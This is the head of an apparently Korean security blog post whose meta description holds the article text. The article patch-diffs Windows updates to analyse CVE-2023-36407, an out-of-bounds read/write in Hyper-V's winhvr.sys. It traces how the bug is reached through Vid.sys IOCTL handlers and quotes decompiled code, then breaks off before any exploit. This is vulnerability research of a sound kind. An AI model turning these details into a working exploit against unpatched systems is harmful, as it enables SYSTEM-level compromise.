

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! &amp;#xBB34;&amp;#xB824; Part 7&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC628; pwndorei&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; Part 6&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; Hyper-V &amp;#xD328;&amp;#xCE58; &amp;#xC790;&amp;#xB3D9;&amp;#xD654; &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xC778; &lt;a href=&#34;https://github.com/pwndorei/Patch-V&#34;&gt;Patch-V&lt;/a&gt;&amp;#xB97C; &amp;#xC18C;&amp;#xAC1C;&amp;#xD558;&amp;#xACE0; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC608;&amp;#xC2DC;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xBC29;&amp;#xBC95;&amp;#xC744; &amp;#xC54C;&amp;#xB824;&amp;#xB4DC;&amp;#xB838;&amp;#xC5C8;&amp;#xC8E0;? &amp;#xC774;&amp;#xBC88;&amp;#xC5D0;&amp;#xB294; Patch-V&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; Hyper-V LPE &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC778; CVE-2023-36407&amp;#xC744; Patch Diffiing&amp;#xD558;&amp;#xACE0; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;!&lt;/p&gt;
&lt;h1 id=&#34;Patch&#34;&gt;&lt;a href=&#34;#Patch&#34; class=&#34;headerlink&#34; title=&#34;Patch&#34;&gt;&lt;/a&gt;Patch&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;Part 6&amp;#xC5D0;&amp;#xC11C; CVE-2024-20699&amp;#xC640; CVE-2024-20700&amp;#xB97C; &amp;#xBD84;&amp;#xC11D;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; KB5034121&amp;#xC640; KB5033369&amp;#xB97C; Diffing&amp;#xD55C; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xC774;&amp;#xBC88;&amp;#xC5D0;&amp;#xB294; KB5031354&amp;#xACFC; KB5032190&amp;#xC744; Diffing&amp;#xD574;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;Windows 11 22H2(x64)&amp;#xAE30;&amp;#xC900; KB5032190&amp;#xB85C; &amp;#xD328;&amp;#xCE58;&amp;#xB41C; Hyper-V &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; Information Disclosure &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC778; CVE-2023-36406&amp;#xACFC; Elevation of Privilege &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC778; CVE-2023-36407, CVE-2023-36408&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;Patch-V&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xC5BB;&amp;#xC5B4;&amp;#xC9C4; &amp;#xAC01; &amp;#xBC84;&amp;#xC804;&amp;#xC758; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB4E4;&amp;#xC744; &amp;#xB514;&amp;#xD551;&amp;#xD55C; BinDiff &amp;#xC6CC;&amp;#xD06C;&amp;#xC2A4;&amp;#xD398;&amp;#xC774;&amp;#xC2A4;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image0.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image0.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xBCC0;&amp;#xACBD;&amp;#xC810;&amp;#xC774; &amp;#xAF64;&amp;#xB098; &amp;#xB9CE;&amp;#xC744; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;? &amp;#xAC01; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC; &amp;#xBCC4;&amp;#xB85C; &amp;#xBC14;&amp;#xB010; &amp;#xC810;&amp;#xC774; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC5B4;&amp;#xB5A4; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xBC14;&amp;#xB00C;&amp;#xC5C8;&amp;#xB294;&amp;#xC9C0; &amp;#xC804;&amp;#xBD80; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xB294; &amp;#xAC83;&amp;#xB3C4; &amp;#xBB34;&amp;#xB9AC;&amp;#xB294; &amp;#xC544;&amp;#xB2C8;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC2DC;&amp;#xAC04;&amp;#xC774; &amp;#xB108;&amp;#xBB34; &amp;#xC624;&amp;#xB798; &amp;#xAC78;&amp;#xB9B4; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC800;&amp;#xB294; &amp;#xACF5;&amp;#xAC1C;&amp;#xB41C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xCD5C;&amp;#xB300;&amp;#xD55C; &amp;#xD65C;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xCDE8;&amp;#xC57D;&amp;#xD560; &amp;#xAC00;&amp;#xB2A5;&amp;#xC131;&amp;#xC774; &amp;#xB192;&amp;#xC740; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB4E4; &amp;#xBA3C;&amp;#xC800; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xAE30;&amp;#xB85C; &amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; CVE-2023-36407&amp;#xACFC; CVE-2023-36408 &amp;#xBAA8;&amp;#xB450; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xACFC; &amp;#xAD00;&amp;#xB828;&amp;#xB41C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774;&amp;#xAE30;&amp;#xC5D0; &amp;#xBA3C;&amp;#xC800; &lt;code&gt;.sys&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xB4E4;&amp;#xBD80;&amp;#xD130; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xBA74; &amp;#xC88B;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xC8E0;? &amp;#xD2B9;&amp;#xD788; &lt;a href=&#34;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36407&#34;&gt;MSRC&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; FAQ&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xC801;&amp;#xD600;&amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Q&lt;/span&gt;: What privileges could be gained by an attacker who successfully exploited this vulnerability?

&lt;span class=&#34;hljs-attribute&#34;&gt;A&lt;/span&gt;: An attacker who successfully exploited this vulnerability could gain SYSTEM privileges.&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xD558;&amp;#xBA74; &lt;code&gt;SYSTEM&lt;/code&gt; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xD68D;&amp;#xB4DD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;&amp;#xB77C;&amp;#x2026; Root Partition&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &amp;#xCEE4;&amp;#xB110; &amp;#xB4DC;&amp;#xB77C;&amp;#xC774;&amp;#xBC84;&amp;#xB4E4;&amp;#xC744; &amp;#xC704;&amp;#xC8FC;&amp;#xB85C; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xBA74; &amp;#xB420; &amp;#xAC83; &amp;#xAC19;&amp;#xB124;&amp;#xC694;!&lt;/p&gt;
&lt;h1 id=&#34;Diffing&#34;&gt;&lt;a href=&#34;#Diffing&#34; class=&#34;headerlink&#34; title=&#34;Diffing&#34;&gt;&lt;/a&gt;Diffing&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;&lt;code&gt;.sys&lt;/code&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xB4E4;&amp;#xC744; &amp;#xC9D1;&amp;#xC911;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF8; &amp;#xACB0;&amp;#xACFC;, &lt;code&gt;winhvr.sys&lt;/code&gt;&amp;#xC758; &lt;code&gt;WinHvGetVpState&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC640; &lt;code&gt;WinHvSetVpState&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD06C;&amp;#xAC8C; &amp;#xBC14;&amp;#xB00C;&amp;#xC5C8;&amp;#xACE0; &lt;code&gt;WinHvpSetupVpStatePfnBuffer&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xC0AD;&amp;#xC81C;&amp;#xB41C; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image1.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image2.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image2.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB97C; &amp;#xBCF4;&amp;#xC2DC;&amp;#xBA74; &amp;#xD328;&amp;#xCE58; &amp;#xC774;&amp;#xD6C4;&amp;#xB85C; &amp;#xC5EC;&amp;#xB7EC; Basic Block&amp;#xC774; &amp;#xCD94;&amp;#xAC00;&amp;#xB41C; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xC5B4;&amp;#xB5A4; &amp;#xAC12;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xAC80;&amp;#xC0AC;&amp;#xAC00; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD588;&amp;#xACE0; &amp;#xD328;&amp;#xCE58;&amp;#xB294; &amp;#xD574;&amp;#xB2F9; &amp;#xAC12;&amp;#xC744; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xD5A5;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C4; &amp;#xAC78;&amp;#xAE4C;&amp;#xC694;?&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image3.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBE44;&amp;#xAD50;&amp;#xD55C; &amp;#xACB0;&amp;#xACFC;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image4.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image4.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xD328;&amp;#xCE58;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; &amp;#xC0AD;&amp;#xC81C;&amp;#xB41C; &lt;code&gt;WinHvpSetupVpStatePfnBuffer&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xD638;&amp;#xCD9C;(&amp;#xC67C;&amp;#xCABD;, Line 30)&amp;#xC774; &amp;#xC0AC;&amp;#xB77C;&amp;#xC9C0;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xB2E4;&amp;#xB978; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xB300;&amp;#xCCB4;&amp;#xD55C; &amp;#xAC83;&amp;#xACFC; &lt;code&gt;memmove&lt;/code&gt;&amp;#xC758; &amp;#xC138; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xC778; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD560; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC758; &amp;#xAE38;&amp;#xC774; + 0x28&amp;#xC774; 0x1000&amp;#xBCF4;&amp;#xB2E4; &amp;#xD070;&amp;#xC9C0; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xB294; &amp;#xB8E8;&amp;#xD2F4;&amp;#xC774; &amp;#xCD94;&amp;#xAC00;(&amp;#xC624;&amp;#xB978;&amp;#xCABD;, Line 39)&amp;#xB41C; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB124;&amp;#xC694;!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;WinHvGetVpState&lt;/code&gt; &amp;#xB610;&amp;#xD55C; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xD328;&amp;#xCE58;&amp;#xAC00; &amp;#xC801;&amp;#xC6A9;&amp;#xB41C; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image5.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image5.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC0AD;&amp;#xC81C;&amp;#xB41C; &lt;code&gt;WinHvpSetupVpStatePfnBuffer&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740;&amp;#xB370;&amp;#xC694;?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image6.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image6.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ExAllocatePool2&lt;/code&gt;&amp;#xC640; &lt;code&gt;MmGetPhysicalAddress&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xACFC; &amp;#xB2E4;&amp;#xB978; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCF4;&amp;#xC544; &amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xC0AD;&amp;#xC81C;&amp;#xB418;&amp;#xACE0; &amp;#xCD94;&amp;#xAC00;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC;&amp;#xC640; &amp;#xC644;&amp;#xC804; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xCD94;&amp;#xC815;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xC544;&amp;#xB9C8; &amp;#xB2E4;&amp;#xB978; &amp;#xACF3;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC9C0;&amp;#xB3C4; &amp;#xC54A;&amp;#xACE0; &amp;#xD568;&amp;#xC218;&amp;#xB85C;&amp;#xC11C;&amp;#xC758; &amp;#xC758;&amp;#xBBF8;&amp;#xAC00; &amp;#xD1F4;&amp;#xC0C9;&amp;#xB418;&amp;#xC5B4; &amp;#xC0AC;&amp;#xB77C;&amp;#xC9C4;&amp;#xAC8C; &amp;#xC544;&amp;#xB2D0;&amp;#xAE4C; &amp;#xC870;&amp;#xC2EC;&amp;#xC2A4;&amp;#xB808; &amp;#xCD94;&amp;#xCE21;&amp;#xD574;&amp;#xBD05;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026;&lt;/p&gt;
&lt;h1 id=&#34;Vulnerability&#34;&gt;&lt;a href=&#34;#Vulnerability&#34; class=&#34;headerlink&#34; title=&#34;Vulnerability&#34;&gt;&lt;/a&gt;Vulnerability&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;&amp;#xC815;&amp;#xB9AC;&amp;#xD558;&amp;#xC790;&amp;#xBA74; CVE-2023-36407&amp;#xC740; &lt;code&gt;winhvr.sys&lt;/code&gt;&amp;#xC758; &lt;code&gt;WinHvGetVpState&lt;/code&gt;&amp;#xC640; &lt;code&gt;WinHvSetVpState&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;memove&lt;/code&gt;&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &lt;code&gt;Size&lt;/code&gt; &amp;#xAC12;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xAC80;&amp;#xC0AC;&amp;#xAC00; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; OOB Read/Write &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;! &lt;code&gt;WinHvGetVpState&lt;/code&gt;&amp;#xB85C; OOB Read&amp;#xB97C; &lt;code&gt;WinHvSetVpState&lt;/code&gt;&amp;#xB85C; OOB Write&amp;#xB97C; &amp;#xC218;&amp;#xD589;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xD37C;&amp;#xB294; &lt;code&gt;&amp;quot;WHvJ&amp;quot;&lt;/code&gt; &amp;#xD0DC;&amp;#xADF8;&amp;#xB85C; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; 0x1000 &amp;#xD06C;&amp;#xAE30;&amp;#xC758; Non-paged Pool&amp;#xB85C; Hypercall&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &amp;#xBC84;&amp;#xD37C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC758; &amp;#xC774;&amp;#xB984;&amp;#xC5D0;&amp;#xC11C; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xAC00;&amp;#xC0C1; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC11C;(Virtual Processor)&amp;#xC758; &amp;#xC0C1;&amp;#xD0DC;(State)&amp;#xB97C; &amp;#xAD00;&amp;#xB9AC;&amp;#xD558;&amp;#xB294; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;Triggering-the-Bug&#34;&gt;&lt;a href=&#34;#Triggering-the-Bug&#34; class=&#34;headerlink&#34; title=&#34;Triggering the Bug&#34;&gt;&lt;/a&gt;Triggering the Bug&lt;/h1&gt;&lt;p&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC11C;&amp;#xB294; &amp;#xBA3C;&amp;#xC800; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC744; &amp;#xC54C; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC740; &lt;code&gt;winhvr.sys&lt;/code&gt; &amp;#xB0B4;&amp;#xBD80;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0; Export&amp;#xB418;&amp;#xACE0; &amp;#xC788;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xACE0; Virtualization Infrastructure Driver(&lt;code&gt;Vid.sys&lt;/code&gt;)&amp;#xC5D0;&amp;#xC11C; Import&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;Vid-VidExoIoControlPartition&#34;&gt;&lt;a href=&#34;#Vid-VidExoIoControlPartition&#34; class=&#34;headerlink&#34; title=&#34;Vid!VidExoIoControlPartition&#34;&gt;&lt;/a&gt;Vid!VidExoIoControlPartition&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Vid.sys&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;WinHvGetVpState&lt;/code&gt;&amp;#xC640; &lt;code&gt;WinHvSetVpState&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &amp;#xC774;&amp;#xB984;&amp;#xC5D0;&amp;#xC11C; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; I/O Control&amp;#xC744; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xB294; &lt;code&gt;VidExoIoControlPartition&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;ulonglong VidExoIoControlPartition
                    (undefined (*param_1) [&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;],_IRP *param_2,ulonglong *FileObject,&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *InputBuffer
                    ,uint InputBufferLength,&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *OutputBuffer,uint OutputBufferLength,
                    uint ControlCode,uint *param_9)

{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; iVar1;
  ulonglong uVar2;
  undefined4 extraout_var;
  undefined4 extraout_var_00;
  
  *param_9 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (ControlCode == &lt;span class=&#34;hljs-number&#34;&gt;0x221278&lt;/span&gt;) {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (InputBufferLength &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt;) {
      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0xc0000023&lt;/span&gt;;
    }
                    &lt;span class=&#34;hljs-comment&#34;&gt;/* WARNING: Load size is inaccurate */&lt;/span&gt;
    uVar2 = WinHvInstallIntercept
                      (*(undefined8 *)(param_1[&lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;] + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;),*InputBuffer,(longlong)InputBuffer + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;);
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar2;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-number&#34;&gt;0x221198&lt;/span&gt; &amp;lt; ControlCode) {
    &lt;span class=&#34;hljs-keyword&#34;&gt;switch&lt;/span&gt;(ControlCode) {
	&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&amp;apos;&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x221264&lt;/span&gt;:
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (InputBufferLength &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0xc0000023&lt;/span&gt;;
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (OutputBufferLength == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
